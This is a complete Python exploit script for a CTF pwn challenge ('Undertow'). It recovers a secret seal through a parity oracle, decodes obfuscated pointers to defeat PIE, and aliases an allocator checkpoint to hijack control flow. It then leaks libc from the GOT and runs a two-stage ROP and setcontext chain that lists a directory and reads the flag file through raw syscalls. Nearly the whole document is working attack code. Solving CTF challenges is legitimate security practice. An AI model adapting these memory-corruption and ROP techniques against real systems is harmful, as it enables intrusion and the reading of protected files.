#!/usr/bin/env python3
"""End-to-end exploit for z0d1akCTF 2026 Undertow."""

from __future__ import annotations

import argparse
import concurrent.futures
import re
import socket
import ssl
import struct
import time
from dataclasses import dataclass


DEFAULT_HOST = "undertow-aa6bcbd8568d.chals.z0d1ak.org"
DEFAULT_PORT = 1337

MASK64 = (1 << 64) - 1
GAMMA = 0x9E3779B97F4A7C15

PIE_CHECKPOINT = 0x2370
PIE_POP_RDI = 0x142A
PIE_POP_RSI_R15 = 0x1428
PIE_POP_RSP_R13 = 0x20F9
PIE_READ_EXACT = 0x2130
PIE_WRITE_EXACT = 0x2320
PIE_EXIT_PLT = 0x1050
PIE_GOT_START = 0x4F30

LIBC_WRITE = 0x11C690
LIBC_SETCONTEXT = 0x4A960
LIBC_SYSCALL = 0x127370


def rol(value: int, count: int) -> int:
    count &= 63
    return ((value << count) | (value >> (64 - count))) & MASK64


def ror(value: int, count: int) -> int:
    count &= 63
    return ((value >> count) | (value << (64 - count))) & MASK64


def p64(value: int) -> bytes:
    return struct.pack("<Q", value & MASK64)


def u64(value: bytes) -> int:
    return struct.unpack("<Q", value)[0]


def parity(value: int) -> int:
    return bin(value).count("1") & 1


class Tube:
    def __init__(self, host: str, port: int, timeout: float = 8.0):
        raw = socket.create_connection((host, port), timeout=timeout)
        context = ssl.create_default_context()
        self.sock = context.wrap_socket(raw, server_hostname=host)
        self.sock.settimeout(timeout)
        self.buffer = bytearray()

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def sendline(self, value: int | str) -> None:
        self.send(str(value).encode() + b"\n")

    def recv_until(self, marker: bytes) -> bytes:
        while marker not in self.buffer:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(f"connection closed before {marker!r}")
            self.buffer.extend(chunk)
        end = self.buffer.index(marker) + len(marker)
        result = bytes(self.buffer[:end])
        del self.buffer[:end]
        return result

    def recv_exact(self, size: int) -> bytes:
        while len(self.buffer) < size:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(f"connection closed after {len(self.buffer)}/{size} bytes")
            self.buffer.extend(chunk)
        result = bytes(self.buffer[:size])
        del self.buffer[:size]
        return result

    def recv_all(self) -> bytes:
        result = bytearray(self.buffer)
        self.buffer.clear()
        try:
            while True:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                result.extend(chunk)
        except (OSError, TimeoutError):
            pass
        return bytes(result)


def parse_session(banner: bytes) -> int:
    match = re.search(rb"^101 ([0-9a-f]{16})$", banner, re.MULTILINE)
    if match is None:
        raise ValueError(f"missing session token in {banner!r}")
    return int(match.group(1), 16)


def crc16_session(token: int) -> int:
    crc = 0x1D0F
    for value in struct.pack("<Q", token):
        crc ^= value << 8
        for _ in range(8):
            crc = ((crc << 1) ^ (0x1021 if crc & 0x8000 else 0)) & 0xFFFF
    return crc


def splitmix(value: int) -> int:
    value ^= value >> 30
    value = value * 0xBF58476D1CE4E5B9 & MASK64
    value ^= value >> 27
    value = value * 0x94D049BB133111EB & MASK64
    return value ^ (value >> 31)


def oracle_mask(token: int) -> int:
    low = splitmix(((0x73D5A9C41F286BE0 ^ token) + GAMMA) & MASK64)
    high_seed = rol(token, 23) ^ 0xA6E87C159BD2034F
    high = splitmix((high_seed + GAMMA) & MASK64)
    return low | (high << 64)


def query_oracle(host: str, port: int) -> tuple[int, int]:
    last_error: Exception | None = None
    for _ in range(2):
        tube: Tube | None = None
        try:
            tube = Tube(host, port)
            token = parse_session(tube.recv_until(b"900\n"))
            tube.sendline(8)
            tube.recv_until(b"810\n")
            tube.sendline(crc16_session(token))
            response = tube.recv_until(b"\n")
            match = re.fullmatch(rb"812 ([01])\n", response)
            if match is None:
                raise ValueError(f"unexpected oracle response: {response!r}")
            return oracle_mask(token), int(match.group(1))
        except (OSError, EOFError, ValueError) as error:
            last_error = error
        finally:
            if tube is not None:
                tube.close()
    raise RuntimeError(f"oracle query failed after retries: {last_error}")


class LinearSystem:
    def __init__(self):
        self.rows: dict[int, tuple[int, int]] = {}
        self.observations: list[tuple[int, int]] = []

    def add(self, mask: int, result: int) -> None:
        self.observations.append((mask, result))
        while mask:
            pivot = mask.bit_length() - 1
            if pivot not in self.rows:
                self.rows[pivot] = (mask, result)
                return
            row_mask, row_result = self.rows[pivot]
            mask ^= row_mask
            result ^= row_result
        if result:
            raise RuntimeError("inconsistent seal equations")

    def solve(self) -> int:
        if len(self.rows) != 128:
            raise RuntimeError(f"seal matrix has rank {len(self.rows)}, not 128")
        answer = 0
        for pivot in range(128):
            mask, result = self.rows[pivot]
            bit = result ^ parity(mask & answer)
            answer |= bit << pivot
        for mask, result in self.observations:
            if parity(mask & answer) != result:
                raise RuntimeError("recovered seal does not satisfy its equations")
        return answer


def recover_seal(host: str, port: int, workers: int) -> bytes:
    system = LinearSystem()
    while len(system.rows) < 128:
        batch_size = max(1, workers * 2)
        completed = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
            futures = [pool.submit(query_oracle, host, port) for _ in range(batch_size)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    mask, result = future.result()
                except RuntimeError as error:
                    print(f"[!] oracle retry deferred: {error}")
                    continue
                system.add(mask, result)
                completed += 1
        print(f"[+] seal oracle rank: {len(system.rows)}/128")
        if completed == 0:
            time.sleep(3)
    return system.solve().to_bytes(16, "little")


@dataclass(frozen=True)
class Keys:
    pointer_add: int
    pointer_xor: int
    context_add: int
    context_xor: int


def derive_keys(seal: bytes) -> Keys:
    low = u64(seal[:8])
    high = u64(seal[8:])
    pointer_add = rol((low + high + 0x3AD7F16C805E294B) & MASK64, 31)
    pointer_xor = rol(low ^ high ^ 0x91E4B37AC6205DF8, 23)
    context_add = rol(high ^ 0xB47C19E25A603DF8, 29)
    context_xor = low ^ 0x6D8F2A41C395E7B0
    return Keys(pointer_add, pointer_xor, context_add, context_xor)


def encode_context_pointer(pointer: int, keys: Keys) -> int:
    return (rol(pointer ^ keys.context_xor, 13) + keys.context_add) & MASK64


def decode_context_pointer(encoded: int, keys: Keys) -> int:
    return ror((encoded - keys.context_add) & MASK64, 13) ^ keys.context_xor


def checkpoint_hash(record: bytes, keys: Keys) -> int:
    state = keys.context_xor ^ 0x4F17B2C39A68DE05
    stream = keys.context_add
    for index in range(8):
        stream = (stream + 0x6A09E667F3BCC909) & MASK64
        value = u64(record[0x40 + index * 8 : 0x48 + index * 8])
        state ^= (value + stream) & MASK64
        rotation = ((index * 7) % 47 + 9) & 63
        state = rol(state, rotation) * 0x9E3779B185EBCA87 & MASK64
        state ^= state >> 29
    return rol(keys.context_add, 17) ^ state ^ 0xC2B2AE3D27D4EB4F


def allocator_route(seal: bytes) -> tuple[int, list[int]]:
    create_index = (seal[2] ^ 0x552) % 3
    snapshot_index = (seal[2] ^ 0x55A) % 3

    def route(value: int) -> tuple[int, int]:
        mixed = (value * 0xC5 + seal[4]) & 0xFF
        return mixed % 3, (seal[5] + mixed // 3) % 3

    # Two zero-valued churn records release the live checkpoint to its tagged
    # list. Reclaim it with a value that sends it toward the snapshot list,
    # then two more zero records release it there immediately before command 4.
    for value in range(256):
        allocation_index, destination_index = route(value)
        if allocation_index == create_index and destination_index == snapshot_index:
            return snapshot_index, [0, 0, value, 0, 0]
    raise RuntimeError("could not find allocator route to alias the checkpoint")


def build_stage1(pie: int, scratch: int) -> bytes:
    pop_rdi = pie + PIE_POP_RDI
    pop_rsi = pie + PIE_POP_RSI_R15
    chain = b"".join(
        (
            p64(pie + PIE_GOT_START),
            p64(pop_rsi),
            p64(0xA8),
            p64(0),
            p64(pie + PIE_WRITE_EXACT),
            p64(pop_rdi),
            p64(scratch + 0x1000),
            p64(pop_rsi),
            p64(0x1000),
            p64(0),
            p64(pie + PIE_READ_EXACT),
            p64(pie + PIE_POP_RSP_R13),
            p64(scratch + 0x1000),
        )
    )
    return chain.ljust(0x1000, b"\0")


def put64(buffer: bytearray, offset: int, value: int) -> None:
    buffer[offset : offset + 8] = p64(value)


def make_context(
    address: int,
    syscall_wrapper: int,
    stack: int,
    number: int,
    arg1: int,
    arg2: int,
    arg3: int,
    arg4: int = 0,
) -> bytes:
    context = bytearray(0x200)
    put64(context, 0x28, arg4)                # r8
    put64(context, 0x30, 0)                   # r9
    put64(context, 0x68, number)              # rdi: syscall number
    put64(context, 0x70, arg1)                # rsi: syscall arg 1
    put64(context, 0x88, arg2)                # rdx: syscall arg 2
    put64(context, 0x98, arg3)                # rcx: syscall arg 3
    put64(context, 0xA0, stack)
    put64(context, 0xA8, syscall_wrapper)
    put64(context, 0xE0, address + 0x180)      # x87 environment
    context[0x180:0x182] = struct.pack("<H", 0x037F)
    context[0x1C0:0x1C4] = struct.pack("<I", 0x1F80)
    return bytes(context)


def build_stage2(pie: int, libc: int, scratch: int) -> bytes:
    base = scratch + 0x1000
    dir_buffer = scratch + 0x2000
    flag_buffer = scratch + 0x2400
    path_buffer = scratch + 0x2800
    how = scratch + 0x3F00

    restore = libc + LIBC_SETCONTEXT + 0x20
    syscall_wrapper = libc + LIBC_SYSCALL
    pop_rdi = pie + PIE_POP_RDI
    pop_rsi = pie + PIE_POP_RSI_R15

    stage = bytearray(0x1000)

    # The stage-1 stack pivot lands on pop r13; ret.
    put64(stage, 0x000, 0)
    put64(stage, 0x008, restore)
    put64(stage, 0x010, base + 0x100)

    contexts = (
        (0x100, 217, 9, dir_buffer, 0x400, 0, base + 0x908),
        (0x300, 437, 9, path_buffer, how, 24, base + 0xA08),
        (0x500, 0, 3, flag_buffer, 0x100, 0, base + 0xB08),
        (0x700, 1, 1, flag_buffer, 0x100, 0, base + 0xC08),
    )
    for offset, number, arg1, arg2, arg3, arg4, stack in contexts:
        context = make_context(
            base + offset,
            syscall_wrapper,
            stack,
            number,
            arg1,
            arg2,
            arg3,
            arg4,
        )
        stage[offset : offset + len(context)] = context

    # After getdents64: disclose directory entries, then read the selected
    # filename from the client before invoking openat2.
    chain = [
        pop_rdi,
        dir_buffer,
        pop_rsi,
        0x400,
        0,
        pie + PIE_WRITE_EXACT,
        pop_rdi,
        path_buffer,
        pop_rsi,
        0x100,
        0,
        pie + PIE_READ_EXACT,
        restore,
        base + 0x300,
    ]
    for index, value in enumerate(chain):
        put64(stage, 0x908 + index * 8, value)

    # Each libc syscall wrapper returns into the next internal setcontext
    # restore. This route avoids setcontext's forbidden rt_sigprocmask call.
    put64(stage, 0xA08, restore)
    put64(stage, 0xA10, base + 0x500)
    put64(stage, 0xB08, restore)
    put64(stage, 0xB10, base + 0x700)
    put64(stage, 0xC08, pop_rdi)
    put64(stage, 0xC10, 0)
    put64(stage, 0xC18, pie + PIE_EXIT_PLT)
    return bytes(stage)


def parse_dirents(data: bytes) -> list[str]:
    names = []
    offset = 0
    while offset + 19 <= len(data):
        record_length = struct.unpack_from("<H", data, offset + 16)[0]
        if record_length < 19 or offset + record_length > len(data):
            break
        raw_name = data[offset + 19 : offset + record_length].split(b"\0", 1)[0]
        if raw_name:
            names.append(raw_name.decode("utf-8", "replace"))
        offset += record_length
    return names


def choose_flag_name(names: list[str]) -> str:
    candidates = [name for name in names if name not in (".", "..")]
    if not candidates:
        raise RuntimeError(f"no file found in flag directory: {names}")
    for name in candidates:
        if "flag" in name.lower():
            return name
    if len(candidates) == 1:
        return candidates[0]
    raise RuntimeError(f"ambiguous flag directory contents: {candidates}")


def upload_stage1(tube: Tube, stage: bytes) -> None:
    tube.sendline(5)
    tube.recv_until(b"510\n")
    tube.sendline(len(stage))
    tube.recv_until(b"511\n")
    tube.send(stage)
    response = tube.recv_until(b"900\n")
    if b"512\n" not in response:
        raise RuntimeError(f"stage upload failed: {response!r}")


def command(tube: Tube, number: int, expected: bytes) -> bytes:
    tube.sendline(number)
    response = tube.recv_until(b"900\n")
    if expected not in response:
        raise RuntimeError(f"command {number} failed: {response!r}")
    return response


def exploit(host: str, port: int, seal: bytes) -> bytes:
    keys = derive_keys(seal)
    snapshot_index, route = allocator_route(seal)
    print(f"[+] checkpoint alias route: {route} (snapshot list {snapshot_index})")

    tube = Tube(host, port)
    try:
        banner = tube.recv_until(b"900\n")
        print(f"[+] target session: {parse_session(banner):016x}")
        command(tube, 1, b"110\n")
        disclosure = command(tube, 2, b"210 ")

        encoded_checkpoint = int(
            re.search(rb"^210 ([0-9a-f]{16})$", disclosure, re.MULTILINE).group(1), 16
        )
        encoded_scratch = int(
            re.search(rb"^211 ([0-9a-f]{16})$", disclosure, re.MULTILINE).group(1), 16
        )
        checkpoint_function = decode_context_pointer(encoded_checkpoint, keys)
        scratch = decode_context_pointer(encoded_scratch, keys)
        pie = checkpoint_function - PIE_CHECKPOINT
        if pie & 0xFFF or scratch & 0xFFF:
            raise RuntimeError(f"invalid decoded addresses: pie={pie:#x}, scratch={scratch:#x}")
        print(f"[+] PIE base:     {pie:#x}")
        print(f"[+] scratch map:  {scratch:#x}")

        upload_stage1(tube, build_stage1(pie, scratch))
        command(tube, 3, b"310\n")
        for value in route:
            tube.sendline(9)
            tube.recv_until(b"910\n")
            tube.sendline(value)
            response = tube.recv_until(b"900\n")
            if b"911\n" not in response:
                raise RuntimeError(f"quarantine operation failed: {response!r}")

        record = bytearray(0x500)
        put64(record, 0x70, encode_context_pointer(scratch, keys))
        put64(record, 0x78, encode_context_pointer(pie + PIE_POP_RDI, keys))
        put64(record, 0x80, checkpoint_hash(record, keys))

        tube.sendline(4)
        tube.recv_until(b"410\n")
        tube.send(record)
        snapshot_response = tube.recv_until(b"900\n")
        if b"411\n" not in snapshot_response:
            raise RuntimeError(f"snapshot overwrite failed: {snapshot_response!r}")

        tube.sendline(6)
        tube.recv_until(b"610\n")
        got = tube.recv_exact(0xA8)
        write_pointer = u64(got[0x20:0x28])
        libc = write_pointer - LIBC_WRITE
        if libc & 0xFFF:
            raise RuntimeError(f"invalid libc base from write@GOT: {libc:#x}")
        print(f"[+] write@libc:   {write_pointer:#x}")
        print(f"[+] libc base:    {libc:#x}")

        tube.send(build_stage2(pie, libc, scratch))
        directory_data = tube.recv_exact(0x400)
        names = parse_dirents(directory_data)
        flag_name = choose_flag_name(names)
        print(f"[+] directory:    {names}")
        print(f"[+] opening:      {flag_name}")
        encoded_name = flag_name.encode() + b"\0"
        tube.send(encoded_name.ljust(0x100, b"\0"))
        return tube.recv_all()
    finally:
        tube.close()


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST)
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    parser.add_argument("--seal", help="known 16-byte seal as 32 hexadecimal digits")
    parser.add_argument("--workers", type=int, default=2)
    args = parser.parse_args()

    if args.seal:
        seal = bytes.fromhex(args.seal)
        if len(seal) != 16:
            raise ValueError("--seal must decode to exactly 16 bytes")
    else:
        seal = recover_seal(args.host, args.port, args.workers)
    print(f"[+] recovered seal: {seal.hex()}")

    output = exploit(args.host, args.port, seal)
    print(output.decode("utf-8", "replace"))
    match = re.search(rb"zdk\{[^}\r\n]+\}", output)
    if match is None:
        raise RuntimeError("exploit completed without finding a flag")
    print(f"[+] flag: {match.group().decode()}")


if __name__ == "__main__":
    main()
